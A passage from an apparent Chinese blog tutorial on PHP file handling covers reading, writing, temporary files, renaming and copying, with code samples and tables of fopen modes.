class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> PHP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP语言 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP-文件系统</title>
      <link href="/post/PHP-FileSystem/"/>
      <url>/post/PHP-FileSystem/</url>
      
        <content type="html"><![CDATA[<p>学习文件处理本质上面就是学习<font color="#00B2EE"><strong>文件处理的函数。</strong></font> ヾ(๑╹◡╹)ﾉ”</p><a id="more"></a><p>&ensp;<br>&ensp;</p><center><font color="#00B2EE" face="Comic sans MS" size="5">PHP 文件系统</font></center><p>&emsp;<br>&emsp;</p><h3 id="一-读取文件"><font color="#FF6347" face="Comic sans MS">一. 读取文件</font><a href="post/PHP-FileSystem#一-读取文件"></a></h3><p>&emsp;</p><h4 id="1-1-readfile读取文件"><font color="#3CB371" face="Comic sans MS">1.1 readfile读取文件</font><a href="post/PHP-FileSystem#1-1-readfile读取文件"></a></h4><p>读取一个文件内容的函数：<font color="#00B2EE" face="Comic sans MS"><strong>int readfile ( string $文件名)</strong></font></p><blockquote><p><font color="#FF7F00"><strong>功能：传入一个文件路径，输出这个文件里面的内容。</strong></font></p></blockquote><pre class="line-numbers language-bash"><code class="language-bash"><span class="token operator">&lt;</span>?php   //linux类的读取方式   readfile<span class="token punctuation">(</span><span class="token string">"/home/paul/test.txt"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   //windows类的读取方式   readfile<span class="token punctuation">(</span><span class="token string">"c:\\boot.ini"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>?<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p><strong>注意：</strong>上面的代码中windows的斜线是\斜线，可能会转义掉一些字符。因此，我们写的时候写上两个斜线。</p></blockquote><p>&emsp;<br>&emsp;</p><h4 id="1-2-file-get-contents打开文件"><font color="#3CB371" face="Comic sans MS">1.2 file_get_contents打开文件</font><a href="post/PHP-FileSystem#1-2-file-get-contents打开文件"></a></h4><p><font face="Comic sans MS">上面的是单纯打文件就直接输出了，有没有打开文件后，能够赋值给一个变量的操作方式呢。</font><br><font color="#00B2EE" face="Comic sans MS"><strong>string file_get_contents ( string filename)</strong></font></p><blockquote><p><font color="#FF7F00"><strong>功能：传入一个文件或文件路径，打开这个文件<font color="#00B2EE">返回</font>文件的内容。文件的内容是一个字符串。</strong></font></p></blockquote><pre class="line-numbers language-bash"><code class="language-bash"><span class="token operator">&lt;</span>?php   <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token string">'NoAlike.txt'</span><span class="token punctuation">;</span>   <span class="token variable">$filestring</span> <span class="token operator">=</span> file_get_contents<span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token keyword">echo</span> <span class="token variable">$filestring</span><span class="token punctuation">;</span>?<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>上面的代码，就打开了一个文件，并且将文件当中的内容进行了输出。</p></blockquote><p>&emsp;<br>我们来针对之前的知识把代码进行一下扩展。用一用之前的知识点。</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>   <span class="token comment" spellcheck="true">//假设我们有一个多行的文件叫NoAlike.txt，没有的话你可以新建一个这个文件</span>    <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token string">'NoAlike.txt'</span><span class="token punctuation">;</span>   <span class="token comment" spellcheck="true">//打开这个文件，将文件内容赋值给$filestring</span>   <span class="token variable">$filestring</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment" spellcheck="true">//因为每一行有一个回车即\n，我用\n来把这个字符串切割成数组</span>   <span class="token variable">$filearray</span> <span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">,</span> <span class="token variable">$filestring</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment" spellcheck="true">//把切割成的数组，下标赋值给$key,值赋值给$val，每次循环将$key加1。</span>   <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token function">list</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">,</span> <span class="token variable">$val</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token function">each</span><span class="token punctuation">(</span><span class="token variable">$filearray</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>       <span class="token operator">++</span><span class="token variable">$key</span><span class="token punctuation">;</span>       <span class="token variable">$val</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$val</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token comment" spellcheck="true">//用的单引号，单引号不解释变量进行了拼接而已</span>       <span class="token keyword">print</span> <span class="token string">'Line'</span> <span class="token punctuation">.</span> <span class="token variable">$key</span> <span class="token punctuation">.</span><span class="token string">':'</span><span class="token punctuation">.</span>  <span class="token variable">$val</span><span class="token punctuation">.</span><span class="token string">'&lt;br />'</span><span class="token punctuation">;</span>   <span class="token punctuation">}</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>&emsp;<br><font face="Comic sans MS">上述的<font color="#00B2EE">explode()、list()</font>两个字符串函数和<font color="#00B2EE">each()</font>数组函数。<br><font color="red"><strong>1. explode()函数：</strong></font><strong>把字符串打散为数组</strong>。</font><font color="#00B2EE">[<a href="http://www.w3school.com.cn/php/func_string_explode.asp" target="_blank" rel="noopener">PHP explode() 函数</a>]</font>&emsp;<font color="#00B2EE">[<a href="http://www.w3school.com.cn/php/php_ref_string.asp" target="_blank" rel="noopener">PHP String 函数</a>]</font><br>语法：explode(separator,string,limit)<br><font color="red"></font></p><div class="article-bounded"><div class="article-table"><table><thead><tr><th align="center">参数</th><th align="left">描述</th></tr></thead><tbody><tr><td align="center">separator</td><td align="left">必需。规定在哪里分割字符串。</td></tr><tr><td align="center">string</td><td align="left">必需。要分割的字符串。</td></tr><tr><td align="center">limit</td><td align="left">可选。规定所返回的数组元素的数目。<br>可能的值：<br>大于 0 - 返回包含最多 limit 个元素的数组<br>小于 0 - 返回包含除了最后的 -limit 个元素以外的所有元素的数组<br>0 - 返回包含一个元素的数组</td></tr></tbody></table></div></div><p>&emsp;<br><font face="Comic sans MS"><font color="red"><strong>2. list()函数：</strong></font><strong>把数组中的值赋给一些变量,在一次操作中给一组变量赋值。</strong></font><font color="#00B2EE">[<a href="http://www.w3school.com.cn/php/func_array_list.asp" target="_blank" rel="noopener">PHP list() 函数</a>]</font></p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$my_array</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">"Dog"</span><span class="token punctuation">,</span><span class="token string">"Cat"</span><span class="token punctuation">,</span><span class="token string">"Horse"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">list</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span> <span class="token variable">$b</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token variable">$my_array</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">"I have several animals, a $a, a $b and a $c."</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>&emsp;<br><font face="Comic sans MS"><font color="red"><strong>3. each()函数：</strong></font><strong>返回当前元素的键名和键值。该元素的键名和键值返回到带有四个元素的数组中。<br>两个元素（1 和 Value）包含键值，两个元素（0 和 Key）包含键名。</strong></font><font color="#00B2EE">[<a href="http://www.w3school.com.cn/php/func_array_each.asp" target="_blank" rel="noopener">PHP each() 函数</a>]</font></p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$people</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">"Bill"</span><span class="token punctuation">,</span> <span class="token string">"Steve"</span><span class="token punctuation">,</span> <span class="token string">"Mark"</span><span class="token punctuation">,</span> <span class="token string">"David"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">each</span><span class="token punctuation">(</span><span class="token variable">$people</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">each</span><span class="token punctuation">(</span><span class="token variable">$people</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span>运行结果：G<span class="token punctuation">:</span>\<span class="token package">WAMP<span class="token punctuation">\</span>www<span class="token punctuation">\</span>2</span><span class="token operator">-</span><span class="token number">20</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">.</span>php<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token keyword">array</span> <span class="token punctuation">(</span>size<span class="token operator">=</span><span class="token number">4</span><span class="token punctuation">)</span>  <span class="token number">1</span> <span class="token operator">=</span><span class="token operator">></span> string <span class="token string">'Bill'</span> <span class="token punctuation">(</span>length<span class="token operator">=</span><span class="token number">4</span><span class="token punctuation">)</span>  <span class="token string">'value'</span> <span class="token operator">=</span><span class="token operator">></span> string <span class="token string">'Bill'</span> <span class="token punctuation">(</span>length<span class="token operator">=</span><span class="token number">4</span><span class="token punctuation">)</span>  <span class="token number">0</span> <span class="token operator">=</span><span class="token operator">></span> int <span class="token number">0</span>  <span class="token string">'key'</span> <span class="token operator">=</span><span class="token operator">></span> int <span class="token number">0</span>G<span class="token punctuation">:</span>\<span class="token package">WAMP<span class="token punctuation">\</span>www<span class="token punctuation">\</span>2</span><span class="token operator">-</span><span class="token number">20</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">.</span>php<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token keyword">array</span> <span class="token punctuation">(</span>size<span class="token operator">=</span><span class="token number">4</span><span class="token punctuation">)</span>  <span class="token number">1</span> <span class="token operator">=</span><span class="token operator">></span> string <span class="token string">'Steve'</span> <span class="token punctuation">(</span>length<span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">)</span>  <span class="token string">'value'</span> <span class="token operator">=</span><span class="token operator">></span> string <span class="token string">'Steve'</span> <span class="token punctuation">(</span>length<span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">)</span>  <span class="token number">0</span> <span class="token operator">=</span><span class="token operator">></span> int <span class="token number">1</span>  <span class="token string">'key'</span> <span class="token operator">=</span><span class="token operator">></span> int <span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>&emsp;<br>&emsp;</p><h4 id="1-3-fopen、fread、fclose操作读取文件"><font color="#3CB371" face="Comic sans MS">1.3 fopen、fread、fclose操作读取文件</font><a href="post/PHP-FileSystem#1-3-fopen、fread、fclose操作读取文件"></a></h4><p>上面file_get_contents打开文件的方式简单、粗暴。下面的<br><font face="Comic sans MS"><font color="#00B2EE"><strong>resource fopen ( string $文件名, string 模式)<br>string fread ( resource $操作资源, int 读取长度)<br>bool fclose ( resource $操作资源 )</strong></font></font></p><p>通过上面的函数我们来讲解<strong>资源类型</strong>的通常操作方式：<br>1.打开资源<br>2.使用相关函数进行操作<br>3.关闭资源<br>&emsp;<br><font color="red"><strong>1. fopen函数：</strong></font><strong>打开文件，返回一个资源</strong><br>参数主要有两个：1.文件打开的路径，2.打开文件的模式<br>例：$fp=fopen(‘NoAlike.txt’, “r”);<br></p><blockquote><p><strong>返回类型是一个资源类型。<br>资源类型需要其他的函数来操作这个资源。</strong><font color="#FF7F00"><strong>所有的资源有打开就要有关闭。</strong></font></p></blockquote><p><font face="Comic sans MS"><font color="red"><strong>2. fread函数：</strong></font><strong>读取打开的文件资源。</strong><br>也包含两个参数，读取指定长度的文件资源，读取一部份向后移动一部份。至到文件结尾。<br>例：$contents = fread($fp, 1024);<br></font></p><p>&emsp;<br><font face="Comic sans MS"><font color="red"><strong>3. fclose函数：</strong></font><strong>fclose函数的功能是关闭资源。资源有打开就有关闭。</strong><br>包含一个参数，这个参数就是fopen()返回的资源。<br>例：fclose($fp);<br></font> </p><p>&emsp;<br><font color="#FF7F00"><strong>fopen的模式</strong></font>有下面几个(。・∀・)ノ<br><font color="red"></font></p><div class="article-bounded"><div class="article-table"><table><thead><tr><th align="center">模式</th><th align="left">说明</th></tr></thead><tbody><tr><td align="center">r</td><td align="left">只读方式打开，将文件指针指向文件头。</td></tr><tr><td align="center">r+</td><td align="left">读写方式打开，将文件指针指向文件头。</td></tr><tr><td align="center">w</td><td align="left">写入方式打开，将文件指针指向文件头并将文件大小截为零。如果文件不存在则尝试创建</td></tr><tr><td align="center">w+</td><td align="left">读写方式打开，将文件指针指向文件头并将文件大小截为零。如果文件不存在则尝试创建</td></tr><tr><td align="center">a</td><td align="left">写入方式打开，将文件指针指向文件末尾。如果文件不存在则尝试创建</td></tr><tr><td align="center">a+</td><td align="left">读写方式打开，将文件指针指向文件末尾。如果文件不存在则尝试创建之</td></tr><tr><td align="center">x</td><td align="left">创建并以写入方式打开，将文件指针指向文件头。如果文件已存在，则 fopen() 调用失败并返回<br> FALSE，并生成一条 E_WARNING 级别的错误信息。如果文件不存在则尝试创建</td></tr><tr><td align="center">x+</td><td align="left">创建并以读写方式打开，将文件指针指向文件头。如果文件已存在，则 fopen() 调用失败并返回 <br>FALSE，并生成一条 E_WARNING 级别的错误信息。如果文件不存在则尝试创建</td></tr></tbody></table></div></div><p>&emsp;<br><font color="#00B2EE"><strong>r模式示例：</strong></font><br>1.打开文件：fopen()<br><font color="red"></font></p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>   <span class="token comment" spellcheck="true">//你可以创建一个NoAlike.txt，以只读模式打开</span>   <span class="token variable">$fp</span> <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">'NoAlike.txt'</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment" spellcheck="true">//var_dump()操作一下$fp看看效果，输出的是不是只有类型提示的是resource</span>   <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>&emsp;<br>2.读取文件：fread()<br><font color="red"></font></p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>   <span class="token variable">$fp</span> <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">'NoAlike.txt'</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment" spellcheck="true">//打开一个文件类型后，读取长度</span>   <span class="token variable">$contents</span> <span class="token operator">=</span> <span class="token function">fread</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">,</span> <span class="token number">1024</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>&emsp;<br>3.关闭文件：fclose()<br><font color="red"></font></p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>   <span class="token variable">$fp</span> <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token variable">$contents</span> <span class="token operator">=</span> <span class="token function">fread</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">,</span> <span class="token number">1024</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token keyword">echo</span> <span class="token variable">$contents</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>&emsp;<br><strong>其他注意事项：</strong></p><div class="article-bounded"><div class="article-table"><table><thead><tr><th align="center">模式</th><th align="left">说明</th></tr></thead><tbody><tr><td align="center">t</td><td align="left">windows下将\n转为\r\n</td></tr><tr><td align="center">b</td><td align="left">二进制打开模式</td></tr></tbody></table></div></div><blockquote><p><font color="#FF7F00"><strong>说明：</strong></font><br>Windows 下提供了一个文本转换标记（’t’）可以透明地将 \n 转换为 \r\n。<br>与此对应还可以使用 ‘b’ 来强制使用二进制模式，这样就不会转换数据。要使用这些标记，要么用 ‘b’ 或者用 ‘t’ 作为 mode 参数的最后一个字符。</p></blockquote><p>&emsp;<br>&emsp;</p><h3 id="二-创建和修改文件内容"><font color="#FF6347" face="Comic sans MS">二. 创建和修改文件内容</font><a href="post/PHP-FileSystem#二-创建和修改文件内容"></a></h3><h4 id="2-1-file-put-contents写入文件"><font color="#3CB371" face="Comic sans MS">2.1 file_put_contents写入文件</font><a href="post/PHP-FileSystem#2-1-file-put-contents写入文件"></a></h4><p><font face="Comic sans MS"><font color="#00B2EE"><strong>int file_put_contents ( string $文件路径, string $写入数据])</strong></font><br></font></p><blockquote><p><strong>功能：向指定的文件当中写入一个字符串，如果文件不存在则创建文件。返回的是写入的字节长度</strong></p></blockquote><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>   <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token string">"在PHP中文网学好PHP，妹子票子不再话下！"</span><span class="token punctuation">;</span>   <span class="token variable">$numbytes</span> <span class="token operator">=</span> <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token string">'bin.txt'</span><span class="token punctuation">,</span> <span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$numbytes</span><span class="token punctuation">)</span><span class="token punctuation">{</span>      <span class="token comment" spellcheck="true">//$numbytes接收到整形的数字</span>       <span class="token keyword">echo</span> <span class="token string">'写入成功，我们读取看看结果试试：'</span><span class="token punctuation">;</span>       <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string">'bin.txt'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>       <span class="token keyword">echo</span> <span class="token string">'写入失败或者没有权限，注意检查'</span><span class="token punctuation">;</span>   <span class="token punctuation">}</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>&emsp;</p><h4 id="2-2-fwrite配合fopen进行写入操作、fopen-打开模式的比较"><font color="#3CB371" face="Comic sans MS">2.2 fwrite配合fopen进行写入操作、fopen()打开模式的比较</font><a href="post/PHP-FileSystem#2-2-fwrite配合fopen进行写入操作、fopen-打开模式的比较"></a></h4><p><font face="Comic sans MS"><font color="#00B2EE"><strong>int fwrite ( resource $文件资源变量, string $写入的字符串 [, int 长度])</strong></font><br>注：fwrite的别名函数是fputs</font></p><p><font color="red"><strong>1. fopen()的w模式：</strong></font>写入方式打开，将文件指针指向文件头并将文件大小截为零。如果文件不存在则尝试创建。每一次写入新的数据时，都会将原来的数据清空之后才写入！<br></p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>   <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token string">'test.txt'</span><span class="token punctuation">;</span>   <span class="token variable">$fp</span><span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token string">"w"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token variable">$len</span> <span class="token operator">=</span> <span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">,</span> <span class="token string">'我是一只来自北方的狼，却在南方冻成了狗'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token keyword">print</span> <span class="token variable">$len</span> <span class="token punctuation">.</span><span class="token string">'字节被写入了\n'</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p><font color="#FF7F00"><strong>总结：</strong></font><br><strong>1. 不论有没有新建都会打开文件重新写入<br>2.原有的文件内容会被覆盖掉<br>3.文件不存在会创建</strong></p></blockquote><p>那我们来对比一下以下几个模式的不同：</p><div class="article-bounded"><div class="article-table"><table><thead><tr><th align="center">模式</th><th align="left">说明</th></tr></thead><tbody><tr><td align="center">r</td><td align="left">只能读不能使用fwrite写</td></tr><tr><td align="center">r+</td><td align="left">可操作读、写(可使用fwrite写入)</td></tr><tr><td align="center">w</td><td align="left">只可以写功能</td></tr><tr><td align="center">w+</td><td align="left">即可读又可以写</td></tr></tbody></table></div></div><p>&emsp;</p><h4 id="2-3-a模式和w模式、x模式和w模式的不同"><font color="#3CB371" face="Comic sans MS">2.3 a模式和w模式、x模式和w模式的不同</font><a href="post/PHP-FileSystem#2-3-a模式和w模式、x模式和w模式的不同"></a></h4><p><font color="#FF7F00"><strong>1. a模式和w模式总结：</strong></font></p><div class="article-bounded"><div class="article-table"><table><thead><tr><th align="center">模式</th><th align="left">总结</th></tr></thead><tbody><tr><td align="center">x</td><td align="left">每次写入会干掉原有文件的内容，文件不存在都会创建</td></tr><tr><td align="center">a</td><td align="left">每次写入都会向文件的尾端追加内容</td></tr></tbody></table></div></div><p>&emsp;<br><font color="#FF7F00"><strong>2. x模式和w模式总结：</strong></font></p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>   <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token string">'test.txt'</span><span class="token punctuation">;</span>   <span class="token variable">$fp</span><span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token string">"x"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token variable">$len</span> <span class="token operator">=</span> <span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">,</span><span class="token string">'读大学迷茫了，PHP中文网学PHP给你希望'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token keyword">echo</span>  <span class="token variable">$len</span> <span class="token punctuation">.</span><span class="token string">'字节被写入了\n'</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p><strong>总结：</strong><br>   1.文件存在的时候会报错<br>   2.如果把$filename 改成其他的文件名,就可以了。但是，再次刷新的时候又报错了<br>   3.x+ 是增强的x模式。读取时也可以使用。</p></blockquote><p>&emsp;<br>&emsp;</p><h3 id="三-创建临时文件"><font color="#FF6347" face="Comic sans MS">三. 创建临时文件</font><a href="post/PHP-FileSystem#三-创建临时文件"></a></h3><p>使用这个函数：<font color="#00B2EE"><strong>resource tmpfile ( )</strong></font></p><blockquote><p><strong>功能：创建一个临时文件，返回资源类型。关闭文件即被删除。</strong></p></blockquote><pre class="line-numbers language-bash"><code class="language-bash"><span class="token operator">&lt;</span>?php   //创建了一个临时文件,创建后并且打开这个文件       <span class="token variable">$handle</span> <span class="token operator">=</span> tmpfile<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   //向里面写入了数据   <span class="token variable">$numbytes</span> <span class="token operator">=</span> fwrite<span class="token punctuation">(</span><span class="token variable">$handle</span>, <span class="token string">'写入临时文件'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   //关闭临时文件，文件即被删除   fclose<span class="token punctuation">(</span><span class="token variable">$handle</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token keyword">echo</span>  <span class="token string">'向临时文件中写入了'</span><span class="token keyword">.</span><span class="token variable">$numbytes</span> <span class="token keyword">.</span> <span class="token string">'个字节'</span><span class="token punctuation">;</span>?<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>&emsp;<br>&emsp;</p><h3 id="四-移动、拷贝和删除文件"><font color="#FF6347" face="Comic sans MS">四. 移动、拷贝和删除文件</font><a href="post/PHP-FileSystem#四-移动、拷贝和删除文件"></a></h3><h4 id="4-1-重命名文件"><font color="#3CB371" face="Comic sans MS">4.1 重命名文件</font><a href="post/PHP-FileSystem#4-1-重命名文件"></a></h4><p><font face="Comic sans MS"><strong>bool</strong> <font color="#00B2EE"><strong>rename(oldname,newname,context)</strong></font>;<br></font></p><div class="article-bounded"><div class="article-table"><table><thead><tr><th align="center">参数</th><th align="left">描述</th></tr></thead><tbody><tr><td align="center">oldname</td><td align="left">必需。规定要重命名的<strong>文件</strong>或<strong>目录(文件夹)</strong>。</td></tr><tr><td align="center">newname</td><td align="left">必需。规定文件或目录的新名称。</td></tr><tr><td align="center">context</td><td align="left">可选。规定文件句柄的环境。context 是可修改流的行为的一套选项。</td></tr></tbody></table></div></div><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>   <span class="token comment" spellcheck="true">//旧文件名</span>   <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token string">'test.php.old'</span><span class="token punctuation">;</span>   <span class="token comment" spellcheck="true">//新文件名</span>   <span class="token variable">$filename2</span> <span class="token operator">=</span> <span class="token string">'test.php'</span><span class="token punctuation">;</span>   <span class="token comment" spellcheck="true">//复制文件</span>   <span class="token function">rename</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token variable">$filename2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>&emsp;</p><h4 id="4-2-复制文件"><font color="#3CB371" face="Comic sans MS">4.2 复制文件</font><a href="post/PHP-FileSystem#4-2-复制文件"></a></h4><p><font face="Comic sans MS"><strong>bool</strong> <font color="#00B2EE"><strong>copy(源文件,目标文件)</strong></font>;<br></font> </p><blockquote><p><strong>功能：将指定路径的源文件，复制一份到目标文件的位置。如果复制到当前目录下，则必须重新改一个名字，其他目录下的话也要在目的路径下加上文件名，不管改不改名字。</strong></p></blockquote><p>copy(source,destination):</p><div class="article-bounded"><div class="article-table"><table><thead><tr><th align="center">参数</th><th align="left">描述</th></tr></thead><tbody><tr><td align="center">source</td><td align="left">必需。规定要复制的文件。</td></tr><tr><td align="center">destination</td><td align="left">必需。规定复制文件的目的地。</td></tr></tbody></table></div></div><p>(1)创建文件并复制到当前文件夹下面<font color="#FF7F00">↓↓</font></p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>    <span class="token comment" spellcheck="true">//创建文件</span>   <span class="token variable">$fi</span> <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">'copy.txt'</span><span class="token punctuation">,</span><span class="token string">"w"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token variable">$a</span><span class="token operator">=</span><span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$fi</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment" spellcheck="true">//旧文件名 </span>   <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token string">'copy.txt'</span><span class="token punctuation">;</span>     <span class="token comment" spellcheck="true">//新文件名   </span>   <span class="token variable">$filename2</span> <span class="token operator">=</span> <span class="token variable">$filename</span> <span class="token punctuation">.</span> <span class="token string">'_new.txt'</span><span class="token punctuation">;</span>     <span class="token comment" spellcheck="true">//修改名字。</span>   <span class="token function">copy</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token variable">$filename2</span><span class="token punctuation">)</span><span class="token 